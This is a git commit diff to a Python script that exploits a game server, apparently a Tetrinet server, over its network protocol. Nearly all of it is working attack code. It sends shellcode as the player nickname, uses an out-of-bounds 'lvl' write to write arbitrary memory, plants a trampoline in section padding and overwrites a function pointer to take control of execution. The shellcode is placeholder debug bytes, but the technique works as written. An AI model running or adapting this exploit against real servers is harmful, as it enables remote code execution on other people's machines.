c74a60a670e2029fba6a1cd0019be8f49e65a349
opticaliqlusion <john.laky1@gmail.com>
2018-01-06 00:21:21 -0500

    added support for nickname shellcode via redirection

--- scripts/send_to_server.py
+++ scripts/send_to_server.py
@@ -1,10 +1,11 @@
-# Exploit summary:
-# "Player number" ends up in EAX, or "offset in player array"
+# Summary:
+# "player number" ends up in EAX, or "offset in player array"
 # "player level" ends up in EBX
-# pass WAY too big a value for player#, write an address into a function table
+# pass WAY too big (or small) a value for player#, write an address into a function table
 # overwrite the stub to another commonly called function
+# octothorpe victory
 
-import socket, sys
+import socket, sys, struct, binascii
 import pytrinet._utils.utils as pyt
 
 N    = 1024*4
@@ -14,9 +15,8 @@ ip   = sys.argv[1]
 
 s.connect((ip, port))
 
-# we could probably find our way back here to the shellcode if
-# absolutely necessary
-shellcode = "\x90"*100 + "\xeb\xfe"
+# there may be a limit to how long this can be
+shellcode = '\xcc' + "\x90"*100 + "\xeb\xfe"
 
 nick    = shellcode
 version = "1.13"
@@ -27,9 +27,47 @@ print(nick, version, serverip)
 print("logging in...")
 out = pyt.encode(nick, version, serverip)+"\xFF"
 s.send(out)
+_, _ = s.recv(N), s.recv(N)
 
-print("sending exploit...")
+# translate an RVA based on the vulnerable instruction
+# CODE:0044B963 mov ds:dword_453F28[eax*4], ebx
+def translate_rva(rva):
+    base = 0x00453f28
+    trans = (rva - base) / 4
+    return trans
+
+def write_dword_anywhere(data, addr):
+    data_to_send = "lvl {} {}\xff".format(translate_rva(addr), data)
+    s.send(data_to_send)
+
+# write to this location to overwrite TranslateMessageA and gain EIP
+translate_msg_addr = 0x00454358
+
+# beginning of padding at the end of a section - only 0x40 to play with
+end_of_section = 0x00452DD4
+
+# a couple of a useful debugging target addresses
 ebfe_addr = 0x0044baff
-s.send("lvl %d %d\xff" % (0xec, ebfe_addr))
-print( s.recv(N) )
-print( s.recv(N) )
+cc_addr   = 0x004010A8
+
+# address of pointer to shellcode
+#   while not referenced directly in this script,
+#   it is assembled into the trampoline shellcode below
+shellcode_ptr_addr = 0x004537bc
+
+# high-bit sensitive trampoline shellcode
+# can only write signed positive dwords - these bytes must be less than 0x80
+trampoline_shellcode = '\xa1\xbc\x37\x45\x00\xff\xe0\x00'
+#                                     ^^              ^^
+
+# first, write the trampoline to the end of a writable section:
+# this will load the known pointer of the shellcode (the nickname)
+# into eax and jump to it
+for i in range(len(trampoline_shellcode) / 4):
+    raw_data = trampoline_shellcode[i*4:(i+1)*4]
+    dword_data = struct.unpack('<I', raw_data)[0]
+    write_dword_anywhere(dword_data, end_of_section + i*4)
+
+# write the trampoline to the translate_msg_a location
+print("sending payload...")
+write_dword_anywhere(end_of_section, translate_msg_addr)
